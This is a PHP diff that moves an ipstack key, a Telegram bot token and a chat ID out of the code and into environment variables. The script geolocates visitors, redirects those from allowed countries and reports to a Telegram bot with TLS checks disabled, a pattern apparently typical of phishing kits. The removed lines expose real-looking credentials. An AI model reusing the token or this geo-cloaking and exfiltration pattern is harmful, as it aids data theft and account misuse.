@@ -23,7 +23,7 @@ function get_ip_server()
 }
 
 $ip = get_ip_server();
-$access_key = 'cf4193at8h68ef4264487612f188c88e';
+$access_key = getenv('IPSTACK_ACCESS_KEY') ?: 'demo';
 
 // Initialize CURL:
 $ch = curl_init('https://api.ipstack.com/' . $ip . '?access_key=' . $access_key . '');
@@ -48,9 +48,9 @@ if (in_array($api_result['country_code'], $allowedCountries)) {
     header('Location: ' . $redirectUrl);
 }
 
-$telegramToken = "8142876449:AAFZ5zO987ZaHxpi_2cGYKXZsU4iV55O5Ck";
+$telegramToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
 $apiUrl = "https://api.telegram.org/bot" . $telegramToken;
-$chatId = "8015711971";
+$chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
 
 
 
@@ -75,9 +75,9 @@ curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
 $result = curl_exec($sender);
 curl_close($sender);
 
-$telegramToken = "8142876449:AAFZ5zO987ZaHxpi_2cGYKXZsU4iV55O5Ck";
+$telegramToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
 $apiUrl = "https://api.telegram.org/bot" . $telegramToken;
-$chatId = "8015711971";
+$chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
 
 
 
